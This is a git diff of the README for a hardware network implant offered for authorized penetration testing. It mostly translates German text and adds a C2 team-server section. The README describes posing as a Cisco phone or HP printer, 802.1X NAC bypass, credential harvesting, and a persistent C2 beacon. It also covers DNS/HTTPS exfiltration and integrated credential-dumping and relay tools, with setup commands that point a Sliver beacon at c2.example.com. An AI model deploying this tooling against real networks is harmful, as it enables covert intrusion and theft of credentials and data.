@@ -16,10 +16,10 @@ running **ParrotOS** (ARM64). Designed for authorized penetration testing engage
 
 ## Overview
 
-The Raccoon Implant is an inline Ethernet tap that bridges two network ports on a custom HAT,
-captures traffic transparently, and provides remote C2 access — all powered via PoE from
-the upstream switch port. The device presents itself as either a Cisco IP Phone or an HP
-network printer to blend into enterprise infrastructure.
+The Raccoon Implant is an inline Ethernet tap that bridges two network ports on a custom HAT
+and captures traffic transparently while providing remote C2 access. The entire device is
+powered via PoE from the upstream switch port. It presents itself as either a Cisco IP Phone
+or an HP network printer to blend into enterprise infrastructure.
 
 ## Architecture
 
@@ -70,7 +70,7 @@ graph TB
 
 ## Hardware
 
-Three build variants — pick the one that fits your engagement:
+Three build variants are available. Pick the one that fits your engagement:
 
 | | Lite (off-the-shelf) | v1 (Pi 4 + HAT) | v2 (CM4 carrier) |
 |---|---|---|---|
@@ -111,40 +111,40 @@ graph LR
 | 1 | USB 3.0 Gigabit Ethernet Adapter | `USB 3.0 Gigabit Ethernet Adapter RTL8153` | ~12 € |
 | 1 | microSD Card 32GB+ (A2) | `SanDisk Extreme 32GB microSD A2` | ~10 € |
 | 1 | UniFi USW-Flex-Mini | `Ubiquiti USW-Flex-Mini` | ~30 € |
-| 3 | Kurze Ethernet-Kabel (30cm) | `Cat6 Ethernet Kabel 30cm kurz` | ~8 € |
-| 1 | USB-C Netzteil 5V 3A (falls kein PoE) | `Raspberry Pi 4 USB-C Netzteil 5V 3A` | ~10 € |
+| 3 | Short Ethernet cables (30cm) | `Cat6 Ethernet Cable 30cm short` | ~8 € |
+| 1 | USB-C PSU 5V 3A (if no PoE) | `Raspberry Pi 4 USB-C Power Supply 5V 3A` | ~10 € |
 
-> **Total: ~€95** (ohne PoE-Injector) — alles bei Amazon/Alternate sofort bestellbar.
+> **Total: ~€95** without PoE injector. All parts are available from Amazon or similar retailers.
 
 **Power Options:**
 
-| Setup | Wie |
+| Setup | How |
 |-------|-----|
-| PoE-powered switch | UniFi USW-Flex-Mini an einem PoE-Switch-Port — versorgt sich selbst |
-| PoE → Pi | USW-Flex-Mini + PoE-Splitter (z.B. `UCTRONICS PoE Splitter USB-C 5V`) → Pi USB-C |
-| Standalone | USB-C Netzteil für Pi + normaler Switch-Uplink |
+| PoE-powered switch | Connect the UniFi USW-Flex-Mini to a PoE switch port so it powers itself |
+| PoE to Pi | Use the USW-Flex-Mini with a PoE splitter (e.g. `UCTRONICS PoE Splitter USB-C 5V`) to feed USB-C into the Pi |
+| Standalone | Use a USB-C power supply for the Pi and a regular switch uplink |
 
-**Vorteile:**
-- Kein Löten, kein PCB — in 10 Minuten einsatzbereit
-- Leicht austauschbare Komponenten
-- UniFi Switch als "normales Netzwerkgerät" unauffällig
-- Perfekt für Red-Team-Trainings und PoC-Demos
+**Advantages:**
+- No soldering and no custom PCB required. Ready to deploy in 10 minutes.
+- Components are easy to replace individually.
+- The UniFi switch blends in as a normal network device.
+- Well suited for red team training and proof-of-concept demos.
 
-**Nachteile:**
-- Größer als v1/v2 (zwei separate Geräte)
-- Kein integriertes PoE für den Pi (Splitter oder USB-C nötig)
-- Weniger covert als Custom-Board im Telefon-/Drucker-Gehäuse
+**Disadvantages:**
+- Physically larger than v1/v2 because it consists of two separate devices.
+- No integrated PoE for the Pi, so a splitter or USB-C PSU is needed.
+- Less covert than a custom board hidden inside a phone or printer enclosure.
 
 **Quick Start (Lite):**
 
 ```bash
-# 1. ParrotOS auf SD flashen
-# 2. Pi booten, USB-Ethernet anschließen
+# 1. Flash ParrotOS onto the SD card
+# 2. Boot the Pi and connect the USB Ethernet adapter
 sudo ./software/setup/bootstrap.sh
 sudo ./software/setup/configure_bridge.sh
 sudo ./services/install.sh
 
-# 3. UniFi Switch: Uplink an Target-Netzwerk, Pi an Port 2, Target an Port 3
+# 3. Connect UniFi switch uplink to target network, Pi to port 2, target device to port 3
 sudo reboot
 ```
 
@@ -163,13 +163,13 @@ Full BOM: [`hardware/bom.csv`](hardware/bom.csv)
 PCB Design: [`hardware/kicad/`](hardware/kicad/) (Schematic + PCB, KiCad 10)
 
 <details>
-<summary><strong>PCB Layout</strong> — click to expand</summary>
+<summary><strong>PCB Layout</strong> (click to expand)</summary>
 <br>
 <p align="center">
-  <img src="static/pcb_boardKiCad.png" alt="Raccoon HAT v1.0 — PCB Layout (KiCad)" width="800">
+  <img src="static/pcb_boardKiCad.png" alt="Raccoon HAT v1.0 PCB Layout (KiCad)" width="800">
 </p>
 <p align="center">
-  <img src="static/pcb_board_KiCad.png" alt="Raccoon HAT v1.0 — PCB 3D Render" width="800">
+  <img src="static/pcb_board_KiCad.png" alt="Raccoon HAT v1.0 PCB 3D Render" width="800">
 </p>
 
 65×56mm 2-layer board with SI3402-B PoE PD, TPS54302 DC-DC, RTL8153B USB-GbE,
@@ -214,7 +214,7 @@ graph LR
 Design guide: [`hardware/v2-integrated/design-guide.md`](hardware/v2-integrated/design-guide.md)
 BOM: [`hardware/v2-integrated/bom.csv`](hardware/v2-integrated/bom.csv)
 
-### Shopping List — v1 HAT Components (Retail)
+### Shopping List for v1 HAT Components (Retail)
 
 Additional retail parts needed alongside the v1 HAT PCB:
 
@@ -222,16 +222,16 @@ Additional retail parts needed alongside the v1 HAT PCB:
 |-----|------|-------------|------------|
 | 1 | Raspberry Pi 4 Model B 4GB | `Raspberry Pi 4 Model B 4GB RAM` | ~60 € |
 | 1 | microSD Card 32GB+ (A2, U3) | `SanDisk Extreme 32GB microSD A2` | ~10 € |
-| 2 | Kurze Ethernet-Kabel (30cm, Cat6) | `Cat6 Ethernet Kabel 30cm kurz` | ~5 € |
+| 2 | Short Ethernet cables (30cm, Cat6) | `Cat6 Ethernet Cable 30cm short` | ~5 € |
 
 > **Note:** The v1 HAT provides PoE power and the second Ethernet port
-> on-board — no USB adapter or USB-C PSU needed in production. For lab
+> on-board, so no USB adapter or USB-C PSU is needed in production. For lab
 > testing without the HAT, use the **Lite** variant above.
 
 ### Parts Sourcing (Electronic Distributors)
 
 All ICs and passives for the custom PoE HAT PCB. Links point to manufacturer
-part pages on Mouser, DigiKey and LCSC — these are stable part-number URLs.
+part pages on Mouser, DigiKey and LCSC. These are stable part-number URLs.
 
 #### ICs & Active Components
 
@@ -272,26 +272,26 @@ part pages on Mouser, DigiKey and LCSC — these are stable part-number URLs.
 | LED Green | 19-217/GHC-YR1S2/3T | 0402 link activity | 1 | [LCSC](https://www.lcsc.com/search?q=19-217%2FGHC-YR1S2) |
 | LED Amber | 19-217/Y2C-CQ2R2L/3T | 0402 power | 1 | [LCSC](https://www.lcsc.com/search?q=19-217%2FY2C-CQ2R2L) |
 
-> **Tip:** Order passives (capacitors, resistors, LEDs) from LCSC — they
-> ship from Shenzhen with low minimums and have every Samsung/Yageo/Murata
-> part in stock. ICs and the transformer are easier to get from Mouser/DigiKey
-> for guaranteed authenticity.
+> **Tip:** Order passives (capacitors, resistors, LEDs) from LCSC. They
+> ship from Shenzhen with low minimums and stock every Samsung/Yageo/Murata
+> part. ICs and the transformer are easier to source from Mouser/DigiKey
+> where authenticity is guaranteed.
 
 ## Software
 
 ### Features
 
-- Transparent Ethernet bridge (zero-config inline tap)
-- Selective traffic capture with BPF filters → PCAP rotation
-- **Two cover identities** (selectable via `configs/raccoon.yaml`):
-  - **Cisco IP Phone 7960** — SIP/RTP/HTTP admin interface
-  - **HP Color LaserJet Pro MFP M478** — HTTP (401), JetDirect/PJL (9100), LPD (515), CUPS/IPP (631), SNMP (161), Telnet (23)
-- **802.1X NAC bypass** — EAPOL forwarding + passive discovery + ebtables/iptables L2/L3 rewriting
-- **Remote access** — SSH reverse tunnel (autossh) + VNC (headless x11vnc), both configurable
+- Transparent Ethernet bridge that acts as a zero-config inline tap
+- Selective traffic capture with BPF filters and rotating PCAP output
+- **Two cover identities** selectable via `configs/raccoon.yaml`:
+  - **Cisco IP Phone 7960** emulating SIP, RTP, and an HTTP admin interface
+  - **HP Color LaserJet Pro MFP M478** emulating HTTP (401), JetDirect/PJL (9100), LPD (515), CUPS/IPP (631), SNMP (161), and Telnet (23)
+- **802.1X NAC bypass** using EAPOL forwarding, passive discovery, and ebtables/iptables L2/L3 rewriting
+- **Remote access** via SSH reverse tunnel (autossh) and VNC (headless x11vnc), both independently configurable
 - Credential capture from HTTP Basic Auth and Telnet login attempts
-- C2 beacon over DNS/HTTPS with jittered callbacks
+- C2 beacon over DNS and HTTPS with jittered callbacks
 - Captured data exfiltration via DNS tunneling or HTTPS
-- Watchdog + systemd auto-recovery
+- Watchdog and systemd auto-recovery
 - Full Cisco IOS-style logging
 
 ### Cover Modes
@@ -304,10 +304,10 @@ part pages on Mouser, DigiKey and LCSC — these are stable part-number URLs.
 Set `device_mode` at the top of `configs/raccoon.yaml` to switch.
 
 <details>
-<summary><strong>Demo: Cisco IP Phone 7960</strong> — click to expand</summary>
+<summary><strong>Demo: Cisco IP Phone 7960</strong> (click to expand)</summary>
 <br>
 <p align="center">
-  <img src="static/cover_cisco_phone.png" alt="Cisco IP Phone 7960 — Login Page" width="700">
+  <img src="static/cover_cisco_phone.png" alt="Cisco IP Phone 7960 Login Page" width="700">
 </p>
 
 Emulates a Cisco Unified Communications login portal. Shows device model,
@@ -317,27 +317,27 @@ and forwarded via notifications.
 </details>
 
 <details>
-<summary><strong>Demo: HP Color LaserJet Pro MFP M478</strong> — click to expand</summary>
+<summary><strong>Demo: HP Color LaserJet Pro MFP M478</strong> (click to expand)</summary>
 <br>
 <p align="center">
-  <img src="static/cover_hp_printer.png" alt="HP LaserJet MFP M478 — EWS Login" width="700">
+  <img src="static/cover_hp_printer.png" alt="HP LaserJet MFP M478 EWS Login" width="700">
 </p>
 
 Emulates the HP Embedded Web Server (EWS) with a full navigation bar
 (Home, Scan, Fax, Web Services, Network, Tools, Settings). Every tab
 requires authentication. The login card shows model, firmware, serial
-number, IP, and MAC — all matching the configured device profile.
+number, IP, and MAC. All values match the configured device profile.
 </details>
 
 ### Quick Setup
 
 #### Option A: Image Builder (recommended)
 
-Build a ready-to-boot SD card from your workstation — no manual setup on the Pi needed.
+Build a ready-to-boot SD card from your workstation without any manual setup on the Pi.
 Runs on Linux, macOS, or WSL2.
 
 ```bash
-# Flash SD card directly (interactive — confirms before writing)
+# Flash SD card directly (interactive, confirms before writing)
 sudo ./software/setup/build_image.sh /dev/sdX
 
 # With WiFi for headless first boot
@@ -357,7 +357,7 @@ sudo ./software/setup/build_image.sh --no-flash
 The image builder downloads ParrotOS ARM64, injects the Raccoon software and config,
 and creates a first-boot provisioning service that installs all dependencies, configures
 networking, and enables all services automatically. Insert the SD card, power on, wait
-~5 minutes for first boot — done.
+~5 minutes for first boot.
 
 #### Option B: Manual setup
 
@@ -370,7 +370,7 @@ sudo ./services/install.sh               # systemd + beacon persistence
 sudo reboot                              # activates MAC spoof + bridge + beacon autorun
 ```
 
-After reboot the C2 beacon starts automatically via 5 independent persistence layers — no manual `systemctl start` needed.
+After reboot the C2 beacon starts automatically via 5 independent persistence layers. No manual `systemctl start` is needed.
 
 ### Beacon Persistence (Autorun)
 
@@ -399,7 +399,7 @@ graph TD
     style TIMER fill:#47a,stroke:#333,color:#fff
 ```
 
-The PID lock file prevents duplicate instances — whichever layer starts first holds the lock, the rest exit silently. The systemd timer watchdog restarts the beacon if all instances die.
+The PID lock file prevents duplicate instances. Whichever layer starts first holds the lock and the rest exit silently. The systemd timer watchdog restarts the beacon if all instances die.
 
 ### Why ParrotOS?
 
@@ -440,10 +440,10 @@ graph LR
 **Deployment (on operator machine):**
 
 ```bash
-# Option 1: Interactive — opens Sliver console
+# Option 1: Interactive, opens Sliver console
 ./software/setup/deploy_sliver.sh generate
 
-# Option 2: Automated — generates with defaults
+# Option 2: Automated, generates with defaults
 ./software/setup/deploy_sliver.sh generate-auto c2.example.com
 
 # Deploy to implant device
@@ -465,6 +465,125 @@ generate beacon --os linux --arch arm64 \
   --name raccoon \
   --save ./bin/implant
 ```
+
+### C2: Team Server (Operator GUI)
+
+The Raccoon C2 Team Server is a Flask-based command & control server with an
+embedded single-page operator GUI. It manages beacon agents, provides an
+interactive terminal, and integrates offensive tooling for post-exploitation.
+
+```mermaid
+graph LR
+    subgraph "Operator"
+        BROWSER["Browser<br/>GUI on :8443"]
+    end
+
+    subgraph "Raccoon C2 Team Server"
+        FLASK["Flask API<br/>+ Embedded GUI"]
+        TOOLS["Server-Side Tools<br/>Impacket · NXC · Lsassy<br/>RelayKing · Responder"]
+    end
+
+    subgraph "Target Network"
+        B1["Beacon 1<br/>(Raccoon Implant)"]
+        B2["Beacon 2<br/>(Pivot Host)"]
+    end
+
+    BROWSER -->|"Bearer Token<br/>HTTPS"| FLASK
+    FLASK <-->|"AES-256-GCM<br/>encrypted tasking"| B1
+    FLASK <-->|"AES-256-GCM"| B2
+    FLASK --- TOOLS
+
+    style FLASK fill:#c44,stroke:#333,color:#fff
+    style TOOLS fill:#47a,stroke:#333,color:#fff
+    style B1 fill:#fa0,stroke:#333,color:#000
+    style B2 fill:#fa0,stroke:#333,color:#000
+```
+
+**GUI Features:**
+
+| Feature | Description |
+|---------|-------------|
+| Agent Management | List, select, and interact with beacon agents in real-time |
+| Interactive Terminal | Send commands to beacons with autocomplete and history |
+| File Browser | Navigate the remote filesystem, download files, upload, and loot directories |
+| Loot Viewer | Browse and download all collected loot (files, credentials) |
+| Process Listing | `tasklist /v` with automatic AV/EDR/SOC product detection (33 products) |
+| Netstat View | Parsed network connections table with automatic security assessment |
+| Pivot View | Discover and enumerate hosts on adjacent subnets |
+| Server Logs | Global server log viewer with filtering (accessible without active agent) |
+
+**Integrated Offensive Tools:**
+
+| Tool | Purpose | Integration |
+|------|---------|-------------|
+| [Impacket](https://github.com/fortra/impacket) | PsExec, WMIExec, SMBExec, SecretsDump, Kerberoast, AS-REP Roast, DCSync | GUI menu with credential input |
+| [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) | Host enumeration, AV/EDR detection, credential spraying, custom modules | Pivot view integration + standalone |
+| [Lsassy](https://github.com/Hackndo/lsassy) | Remote LSASS credential dumping | Via Impacket menu |
+| [RelayKing](https://github.com/depthsecurity/RelayKing-Depth) | NTLM relay vulnerability auditing (SMB/LDAP/HTTP/MSSQL) | Dedicated dialog with domain/target config |
+| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/mDNS poisoning for credential capture | Interface selection, toggle options |
+
+**AV/EDR Enumeration:**
+
+The server includes a built-in AV/EDR scanner based on
+[NXC's enum_av module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/enum_av.py)
+that remotely detects 35 endpoint protection products via Impacket (DCERPC
+LsarLookupNames, IPC$ pipe enumeration, SCM service queries). The beacon also
+has a local `avenum` command that checks running services, WMI SecurityCenter2,
+firewall rules, AMSI, and AppLocker on the compromised host.
+
+**Encryption:**
+
+All beacon communication uses **AES-256-GCM** authenticated encryption. Keys
+can be auto-generated, manually set (base64), or derived from the callback URL
+via SHA-256. The server uses the `cryptography` library while the beacon calls
+OpenSSL via `ctypes`. Both implementations interoperate seamlessly.
+
+#### Quick Start (Native)
+
+```bash
+# Linux / macOS
+cd software/c2
+./start_server.sh
+
+# Windows (PowerShell)
+cd software\c2
+.\start_server.ps1
+```
+
+The launcher checks and installs dependencies automatically (`flask`,
+`cryptography`, `impacket`, `ldap3`, `netexec`, `lsassy`), then prompts for
+host, port, encryption key, and operator token.
+
+#### Quick Start (Docker)
+
+```bash
+cd software/c2
+
+# Build and run
+docker compose up -d
+
+# With custom config
+RACCOON_PORT=443 RACCOON_SSL=1 docker compose up -d
+
+# View logs
+docker compose logs -f raccoon-c2
+```
+
+The Docker image (`python:3.12-slim`) includes all tools pre-installed:
+Impacket, NetExec, Lsassy, RelayKing, and Responder. It runs with
+`network_mode: host` and `NET_RAW`/`NET_ADMIN` capabilities (required for
+Responder).
+
+| Environment Variable | Default | Description |
+|---------------------|---------|-------------|
+| `RACCOON_PORT` | `8443` | Listen port |
+| `RACCOON_HOST` | `0.0.0.0` | Listen address |
+| `RACCOON_KEY` | (none) | AES-256-GCM key (base64) |
+| `RACCOON_DERIVE_KEY` | (none) | Derive key from string via SHA-256 |
+| `RACCOON_TOKEN` | (random) | Operator token for GUI auth |
+| `RACCOON_SSL` | (none) | Enable TLS (set to `1`) |
+| `RACCOON_CERT` | (none) | Path to TLS certificate |
+| `RACCOON_CERTKEY` | (none) | Path to TLS private key |
 
 ### 802.1X NAC Bypass
 
@@ -588,10 +707,10 @@ Edit [`configs/raccoon.yaml`](configs/raccoon.yaml) before deployment.
 
 Set `device_mode` at the top of `raccoon.yaml` to choose the device the implant
 impersonates. This single flag controls hostname, MAC prefix, and all protocol
-emulation — the cover sections below provide the detailed device specs.
+emulation. The cover sections below provide the detailed device specs.
 
 ```yaml
-# Top of raccoon.yaml — one switch for the entire setup
+# Top of raccoon.yaml. This single switch controls the entire setup.
 device_mode: "cisco_phone"    # or "hp_printer"
 ```
 
@@ -601,9 +720,9 @@ device_mode: "cisco_phone"    # or "hp_printer"
 | HP LaserJet MFP M478 | `hp_printer` | General offices with network printers | HP EWS login, JetDirect/PJL, LPD, IPP/CUPS, SNMP (BER), Telnet |
 
 Both covers include:
-- **Credential harvesting** — captured login attempts are logged and forwarded via notifications
-- **Browser fingerprinting** — JavaScript-based recon (Canvas, WebGL/GPU, WebRTC local IP, screen resolution, timezone, installed plugins, hardware concurrency)
-- **Realistic device metadata** — MAC addresses from real vendor OUI ranges, proper protocol responses
+- **Credential harvesting** that captures login attempts and forwards them via notifications
+- **Browser fingerprinting** using JavaScript-based recon covering Canvas, WebGL/GPU, WebRTC local IP, screen resolution, timezone, installed plugins, and hardware concurrency
+- **Realistic device metadata** with MAC addresses from real vendor OUI ranges and proper protocol responses
 
 Tune service ports per cover in the same file:
 
@@ -649,11 +768,11 @@ notifications:
 5. Click **Create** → copy the webhook URL
 6. Paste the URL into `notifications.teams.webhook_url` in `raccoon.yaml`
 
-> **Note:** Microsoft is migrating connectors to the Workflows app. If "Incoming Webhook" is unavailable, create a **Power Automate flow** instead:
+> **Note:** Microsoft is migrating connectors to the Workflows app. If Incoming Webhook is unavailable, create a **Power Automate flow** instead:
 > 1. Go to the channel → **`...`** → **Workflows**
 > 2. Choose "Post to a channel when a webhook request is received"
 > 3. Copy the generated HTTP POST URL
-> 4. Use that URL as `webhook_url` — the Raccoon Implant sends Adaptive Cards which both methods support.
+> 4. Use that URL as `webhook_url`. The Raccoon Implant sends Adaptive Cards which both methods support.
 
 All three platforms can be enabled simultaneously. Each credential capture, fingerprint, and health event is dispatched to all enabled channels.
 
@@ -716,6 +835,8 @@ graph LR
             BEACON_PY["beacon.py"]
             BEACON_SA["beacon_standalone.py"]
             EXFIL_PY["exfil.py"]
+            SERVER_PY["server.py<br/>Team Server + GUI"]
+            DOCKER["Dockerfile<br/>+ docker-compose.yml"]
         end
         NAC_PY["nac_bypass.py"]
         subgraph setup
